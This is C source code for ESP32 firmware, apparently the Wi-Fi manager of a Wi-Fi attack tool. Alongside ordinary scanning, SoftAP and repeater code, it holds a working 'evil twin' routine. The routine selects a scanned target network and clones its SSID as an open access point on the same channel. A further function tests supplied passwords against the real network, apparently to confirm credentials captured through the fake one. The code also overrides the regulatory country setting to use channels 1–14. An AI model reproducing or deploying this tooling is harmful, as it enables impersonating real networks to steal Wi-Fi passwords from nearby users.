#include <string.h>
#include "freertos/FreeRTOS.h"
#include "freertos/event_groups.h"
#include "esp_wifi.h"
#include "esp_log.h"
#include "esp_mac.h"
#include "esp_netif.h"
#include "lwip/inet.h"
#include "lwip/lwip_napt.h"
#include "lwip/err.h"
#include "lwip/tcpip.h"
#include "lwip/dns.h"
#include "nvs_flash.h"
#include "wifi_manager.h"

#define OFFER_DNS 0x02

static const char *TAG = "WIFI_MANAGER";
static const char *NVS_NAMESPACE = "wifi_manager";
static const char *NVS_CHANNEL_KEY = "ap_channel";

static esp_netif_t *ap_netif = NULL;
static esp_netif_t *sta_netif = NULL;
static wifi_scan_data_t scan_data = {0};
static char target_ssid[33] = {0};
static char target_bssid[18] = {0};
static uint8_t target_channel = 0;
static bool has_target = false;
static uint8_t s_original_ap_mac[6];

static bool is_repeater_mode = false;
static char repeater_status[32] = "idle";
static char repeater_ssid[33] = {0};
static char repeater_pass[64] = {0};

static void enable_napt_safe(void *ctx) {
    uint32_t ap_ip = (uint32_t)ctx;
    ip_napt_enable(ap_ip, 1);
    ESP_LOGI(TAG, "NAPT enabled for AP IP " IPSTR " (Safe)", IP2STR((ip4_addr_t*)&ap_ip));
}

static void on_ip_event(void *arg, esp_event_base_t event_base,
                        int32_t event_id, void *event_data) {
    if (event_id == IP_EVENT_STA_GOT_IP) {
        ip_event_got_ip_t *event = (ip_event_got_ip_t *)event_data;
        ESP_LOGI(TAG, "Got IP: " IPSTR, IP2STR(&event->ip_info.ip));

        if (is_repeater_mode) {
            ESP_LOGI(TAG, "Enabling NAPT for Repeater Mode...");
            if (ap_netif) {
                esp_netif_ip_info_t ip_info_ap;
                esp_netif_get_ip_info(ap_netif, &ip_info_ap);

                tcpip_callback(enable_napt_safe, (void*)ip_info_ap.ip.addr);

                esp_netif_dns_info_t dns;
                if (esp_netif_get_dns_info(sta_netif, ESP_NETIF_DNS_MAIN, &dns) == ESP_OK) {
                    esp_netif_set_dns_info(ap_netif, ESP_NETIF_DNS_MAIN, &dns);
                    ESP_LOGI(TAG, "Synced DNS to AP: " IPSTR, IP2STR(&(dns.ip.u_addr.ip4)));
                }
            }
            strcpy(repeater_status, "connected");
        }
    } else if (event_id == IP_EVENT_STA_LOST_IP) {
         ESP_LOGI(TAG, "Lost IP");
         if (is_repeater_mode) {
             strcpy(repeater_status, "connecting");
         }
    }
}

static void on_wifi_event(void *arg, esp_event_base_t event_base,
                          int32_t event_id, void *event_data) {
    if (event_id == WIFI_EVENT_AP_STACONNECTED) {
        wifi_event_ap_staconnected_t *event = (wifi_event_ap_staconnected_t *)event_data;
        ESP_LOGI(TAG, "Station "MACSTR" joined, AID=%d",
                 MAC2STR(event->mac), event->aid);
    } else if (event_id == WIFI_EVENT_AP_STADISCONNECTED) {
        wifi_event_ap_stadisconnected_t *event = (wifi_event_ap_stadisconnected_t *)event_data;
        ESP_LOGI(TAG, "Station "MACSTR" left, AID=%d",
                 MAC2STR(event->mac), event->aid);
    }
}

static esp_err_t save_channel_to_nvs(uint8_t channel) {
    nvs_handle_t nvs_handle;
    esp_err_t err = nvs_open(NVS_NAMESPACE, NVS_READWRITE, &nvs_handle);
    if (err != ESP_OK) {
        ESP_LOGE(TAG, "Error opening NVS handle: %s", esp_err_to_name(err));
        return err;
    }
    err = nvs_set_u8(nvs_handle, NVS_CHANNEL_KEY, channel);
    if (err == ESP_OK) {
        err = nvs_commit(nvs_handle);
    }
    nvs_close(nvs_handle);
    return err;
}

static uint8_t load_channel_from_nvs() {
    nvs_handle_t nvs_handle;
    uint8_t channel = 1;
    if (nvs_open(NVS_NAMESPACE, NVS_READONLY, &nvs_handle) == ESP_OK) {
        nvs_get_u8(nvs_handle, NVS_CHANNEL_KEY, &channel);
        nvs_close(nvs_handle);
    }
    return channel;
}

esp_err_t wifi_manager_init(void) {

    sta_netif = esp_netif_create_default_wifi_sta();
    ap_netif = esp_netif_create_default_wifi_ap();

    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    ESP_ERROR_CHECK(esp_wifi_init(&cfg));

    // Explicitly set Country to JP to allow Channels 1-14
    wifi_country_t wifi_country = {
        .cc = "JP",
        .schan = 1,
        .nchan = 14,
        .policy = WIFI_COUNTRY_POLICY_MANUAL
    };
    if (esp_wifi_set_country(&wifi_country) == ESP_OK) {
        ESP_LOGI(TAG, "WiFi Country set to JP (Channels 1-14)");
    } else {
        ESP_LOGE(TAG, "Failed to set WiFi Country");
    }

    ESP_ERROR_CHECK(esp_wifi_set_storage(WIFI_STORAGE_RAM));

    ESP_ERROR_CHECK(esp_event_handler_instance_register(IP_EVENT,
                                                        ESP_EVENT_ANY_ID,
                                                        &on_ip_event,
                                                        NULL,
                                                        NULL));

    ESP_ERROR_CHECK(esp_event_handler_instance_register(WIFI_EVENT,
                                                        ESP_EVENT_ANY_ID,
                                                        &on_wifi_event,
                                                        NULL,
                                                        NULL));

    ESP_ERROR_CHECK(esp_wifi_get_mac(WIFI_IF_AP, s_original_ap_mac));
    ESP_LOGI(TAG, "Saved original AP MAC: %02x:%02x:%02x:%02x:%02x:%02x",
             s_original_ap_mac[0], s_original_ap_mac[1], s_original_ap_mac[2],
             s_original_ap_mac[3], s_original_ap_mac[4], s_original_ap_mac[5]);
    return ESP_OK;
}

esp_err_t wifi_manager_start_softap(void) {
    esp_netif_ip_info_t ip_info;
    IP4_ADDR(&ip_info.ip, 192, 168, 4, 1);
    IP4_ADDR(&ip_info.gw, 192, 168, 4, 1);
    IP4_ADDR(&ip_info.netmask, 255, 255, 255, 0);
    esp_netif_dhcps_stop(ap_netif);
    esp_netif_set_ip_info(ap_netif, &ip_info);
    esp_netif_dhcps_start(ap_netif);

    wifi_config_t wifi_config;
    memset(&wifi_config, 0, sizeof(wifi_config));

    uint8_t channel = load_channel_from_nvs();
    if (channel < 1 || channel > 13) {
        ESP_LOGW(TAG, "Invalid channel %d loaded from NVS, defaulting to 1", channel);
        channel = 1;
    }

    strlcpy((char *)wifi_config.ap.ssid, SOFTAP_SSID, sizeof(wifi_config.ap.ssid));
    strlcpy((char *)wifi_config.ap.password, SOFTAP_PASS, sizeof(wifi_config.ap.password));
    wifi_config.ap.ssid_len = strlen(SOFTAP_SSID);
    wifi_config.ap.channel = channel;
    wifi_config.ap.authmode = WIFI_AUTH_WPA2_PSK;
    wifi_config.ap.max_connection = SOFTAP_MAX_STA_CONN;

    ESP_LOGI(TAG, "Setting SoftAP Config: SSID='%s', Pass='(hidden)', Channel=%d, Auth=%d",
             wifi_config.ap.ssid, wifi_config.ap.channel, wifi_config.ap.authmode);

    ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_APSTA));
    ESP_ERROR_CHECK(esp_wifi_set_config(WIFI_IF_AP, &wifi_config));
    ESP_ERROR_CHECK(esp_wifi_start());
    ESP_LOGI(TAG, "WiFi AP started on channel %d in APSTA mode. SSID: %s", wifi_config.ap.channel, SOFTAP_SSID);
    return ESP_OK;
}

esp_err_t wifi_manager_stop_softap(void) {
    ESP_LOGI(TAG, "Stopping SoftAP...");

    esp_err_t err = esp_wifi_stop();
    if(err == ESP_OK) {

        ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_STA));
        ESP_ERROR_CHECK(esp_wifi_start());
        ESP_LOGI(TAG, "SoftAP stopped. WiFi restarted in STA mode.");
    }
    return err;
}

esp_err_t wifi_manager_scan_networks(wifi_scan_data_t *scan_data_out) {

    wifi_scan_config_t scan_config = {
        .show_hidden = true,
        .scan_type = WIFI_SCAN_TYPE_ACTIVE,
        .scan_time = {
            .active = {
                .min = 100,
                .max = 300
            }
        }
    };

    esp_err_t ret = esp_wifi_scan_start(&scan_config, true);
    if (ret != ESP_OK) {
        ESP_LOGE(TAG, "Failed to start WiFi scan: %s", esp_err_to_name(ret));
        return ret;
    }

    uint16_t ap_count = MAX_SCAN_RESULTS;
    wifi_ap_record_t ap_records[MAX_SCAN_RESULTS];
    ESP_ERROR_CHECK(esp_wifi_scan_get_ap_records(&ap_count, ap_records));

    scan_data.count = ap_count;
    for (int i = 0; i < ap_count; i++) {
        strncpy(scan_data.results[i].ssid, (char*)ap_records[i].ssid, 32);
        scan_data.results[i].ssid[32] = '\0';
        snprintf(scan_data.results[i].bssid, 18, "%02x:%02x:%02x:%02x:%02x:%02x", ap_records[i].bssid[0], ap_records[i].bssid[1], ap_records[i].bssid[2], ap_records[i].bssid[3], ap_records[i].bssid[4], ap_records[i].bssid[5]);
        scan_data.results[i].rssi = ap_records[i].rssi;
        scan_data.results[i].channel = ap_records[i].primary;
        scan_data.results[i].authmode = ap_records[i].authmode;
    }

    if (scan_data_out) {
        memcpy(scan_data_out, &scan_data, sizeof(wifi_scan_data_t));
    }

    ESP_LOGI(TAG, "Found %d networks", ap_count);
    return ESP_OK;
}

void wifi_manager_scan_networks_advanced(wifi_scan_data_t *scan_data_out) {
    wifi_manager_scan_networks(scan_data_out);
}

esp_err_t wifi_manager_set_target(const char *ssid, const char *bssid) {
    if (!ssid || !bssid) return ESP_ERR_INVALID_ARG;
    strncpy(target_ssid, ssid, 32);
    target_ssid[32] = '\0';
    strncpy(target_bssid, bssid, 17);
    target_bssid[17] = '\0';
    target_channel = 0;

    for (int i = 0; i < scan_data.count; i++) {
        if (strcmp(scan_data.results[i].bssid, bssid) == 0) {
            target_channel = scan_data.results[i].channel;
            break;
        }
    }
    has_target = true;
    ESP_LOGI(TAG, "Target set: %s (%s) on channel %d", target_ssid, target_bssid, target_channel);
    return ESP_OK;
}

esp_err_t wifi_manager_get_target(char *ssid, char *bssid) {
    if (!has_target) return ESP_ERR_NOT_FOUND;
    if (ssid) strcpy(ssid, target_ssid);
    if (bssid) strcpy(bssid, target_bssid);
    return ESP_OK;
}

bool wifi_manager_has_target(void) {
    return has_target;
}

esp_err_t wifi_manager_get_target_channel(uint8_t *channel) {
    if (!has_target || !channel) return ESP_ERR_INVALID_STATE;
    if (target_channel == 0) return ESP_ERR_NOT_FOUND;
    *channel = target_channel;
    return ESP_OK;
}

esp_err_t wifi_manager_change_channel(uint8_t channel) {
    if (channel < 1 || channel > 14) return ESP_ERR_INVALID_ARG;
    wifi_config_t current_config;
    esp_wifi_get_config(WIFI_IF_AP, &current_config);

    wifi_mode_t mode;
    esp_wifi_get_mode(&mode);
    if (mode == WIFI_MODE_STA || mode == WIFI_MODE_NULL) {
        return esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
    }

    if (current_config.ap.channel == channel) {
        return esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
    }

    ESP_LOGI(TAG, "Stopping AP to change channel to %d...", channel);
    save_channel_to_nvs(channel);

    ESP_ERROR_CHECK(esp_wifi_stop());
    current_config.ap.channel = channel;
    ESP_ERROR_CHECK(esp_wifi_set_config(WIFI_IF_AP, &current_config));
    ESP_ERROR_CHECK(esp_wifi_start());
    ESP_LOGI(TAG, "AP restarted on channel %d.", channel);

    return esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
}

esp_err_t wifi_manager_start_evil_twin_ap(void) {
    if (!has_target) {
        ESP_LOGE(TAG, "No target set for Evil Twin AP.");
        return ESP_FAIL;
    }

    // Forcefully disable repeater mode to prevent conflicts
    is_repeater_mode = false;
    strcpy(repeater_status, "idle");

    ESP_LOGI(TAG, "Configuring Evil Twin AP (APSTA Mode) with Cleared STA Config.");
    ESP_ERROR_CHECK(esp_wifi_stop());

    // 1. Clear STA Config to prevent 'Ghost Connections' (Issue 1 Fix)
    wifi_config_t null_conf = {0};
    ESP_ERROR_CHECK(esp_wifi_set_config(WIFI_IF_STA, &null_conf));

    wifi_config_t wifi_config = {
        .ap = {
            .ssid_len = strlen(target_ssid),
            .max_connection = SOFTAP_MAX_STA_CONN,
            .authmode = WIFI_AUTH_OPEN,
            .channel = target_channel,
        },
    };
    strncpy((char *)wifi_config.ap.ssid, target_ssid, sizeof(wifi_config.ap.ssid));

    // 2. Use APSTA Mode for seamless verification (Issue 2 Fix)
    ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_APSTA));
    ESP_ERROR_CHECK(esp_wifi_set_config(WIFI_IF_AP, &wifi_config));

    // 3. Force Channel
    esp_wifi_set_channel(target_channel, WIFI_SECOND_CHAN_NONE);

    ESP_ERROR_CHECK(esp_wifi_start());

    // 4. Force Channel again
    esp_wifi_set_channel(target_channel, WIFI_SECOND_CHAN_NONE);

    ESP_LOGI(TAG, "Evil Twin AP started. SSID: %s on Channel: %d", target_ssid, target_channel);
    return ESP_OK;
}

esp_err_t wifi_manager_restore_softap(void) {
    ESP_LOGI(TAG, "Restoring default SoftAP.");
    ESP_ERROR_CHECK(esp_wifi_stop());
    ESP_ERROR_CHECK(esp_wifi_set_mac(WIFI_IF_AP, s_original_ap_mac));
    return wifi_manager_start_softap();
}

esp_err_t wifi_manager_restore_softap_channel(void) {
    uint8_t original_channel = load_channel_from_nvs();
    return esp_wifi_set_channel(original_channel, WIFI_SECOND_CHAN_NONE);
}

esp_err_t wifi_manager_connect_sta(const char *password) {
    if (!has_target) return ESP_FAIL;
    ESP_LOGI(TAG, "Attempting to connect STA to target: %s", target_ssid);

    wifi_config_t wifi_config = {0};

    size_t ssid_len = strlen(target_ssid);
    if (ssid_len > sizeof(wifi_config.sta.ssid)) ssid_len = sizeof(wifi_config.sta.ssid);
    memcpy(wifi_config.sta.ssid, target_ssid, ssid_len);

    size_t pass_len = strlen(password);
    if (pass_len > sizeof(wifi_config.sta.password)) pass_len = sizeof(wifi_config.sta.password);
    memcpy(wifi_config.sta.password, password, pass_len);

    wifi_config.sta.threshold.authmode = WIFI_AUTH_WPA2_PSK;

    ESP_ERROR_CHECK(esp_wifi_set_config(WIFI_IF_STA, &wifi_config));
    return esp_wifi_connect();
}

esp_err_t wifi_manager_disconnect_sta(void) {
    return esp_wifi_disconnect();
}

esp_err_t wifi_manager_connect_repeater(const char *ssid, const char *password) {
    if (!ssid || !password) return ESP_ERR_INVALID_ARG;

    if (is_repeater_mode && strcmp(repeater_status, "connecting") == 0) {
        ESP_LOGW(TAG, "Already connecting to a repeater, ignoring request.");
        return ESP_ERR_INVALID_STATE;
    }

    strncpy(repeater_ssid, ssid, sizeof(repeater_ssid) - 1);
    repeater_ssid[sizeof(repeater_ssid) - 1] = '\0';
    strncpy(repeater_pass, password, sizeof(repeater_pass) - 1);
    repeater_pass[sizeof(repeater_pass) - 1] = '\0';

    is_repeater_mode = true;
    strcpy(repeater_status, "connecting");

    wifi_mode_t mode;
    esp_wifi_get_mode(&mode);
    if (mode != WIFI_MODE_APSTA) {
        esp_wifi_set_mode(WIFI_MODE_APSTA);
    }

    wifi_config_t current_sta_cfg;
    if (esp_wifi_get_config(WIFI_IF_STA, &current_sta_cfg) == ESP_OK) {
        if (strcmp((char*)current_sta_cfg.sta.ssid, ssid) == 0) {
            esp_netif_ip_info_t ip_info;
            if (esp_netif_get_ip_info(sta_netif, &ip_info) == ESP_OK && ip_info.ip.addr != 0) {
                ESP_LOGI(TAG, "Already connected to %s, enabling NAPT...", ssid);
                esp_netif_ip_info_t ip_info_ap;
                esp_netif_get_ip_info(ap_netif, &ip_info_ap);
                tcpip_callback(enable_napt_safe, (void*)ip_info_ap.ip.addr);

                esp_netif_dns_info_t dns;
                if (esp_netif_get_dns_info(sta_netif, ESP_NETIF_DNS_MAIN, &dns) == ESP_OK) {
                    esp_netif_set_dns_info(ap_netif, ESP_NETIF_DNS_MAIN, &dns);
                }

                strcpy(repeater_status, "connected");
                return ESP_OK;
            }
        }
    }

    wifi_config_t wifi_config = {0};
    strncpy((char*)wifi_config.sta.ssid, ssid, sizeof(wifi_config.sta.ssid) - 1);
    strncpy((char*)wifi_config.sta.password, password, sizeof(wifi_config.sta.password) - 1);
    wifi_config.sta.threshold.authmode = WIFI_AUTH_WPA2_PSK;

    ESP_LOGI(TAG, "Connecting to %s as Repeater...", ssid);
    ESP_ERROR_CHECK(esp_wifi_set_config(WIFI_IF_STA, &wifi_config));

    esp_err_t ret = esp_wifi_connect();
    if (ret != ESP_OK) {
        strcpy(repeater_status, "failed");
        is_repeater_mode = false;
    }
    return ret;
}

esp_err_t wifi_manager_disconnect_repeater(void) {
    is_repeater_mode = false;
    strcpy(repeater_status, "idle");
    return esp_wifi_disconnect();
}

bool wifi_manager_is_repeater_active(void) {
    return is_repeater_mode;
}

char* wifi_manager_get_repeater_status(void) {
    return repeater_status;
}
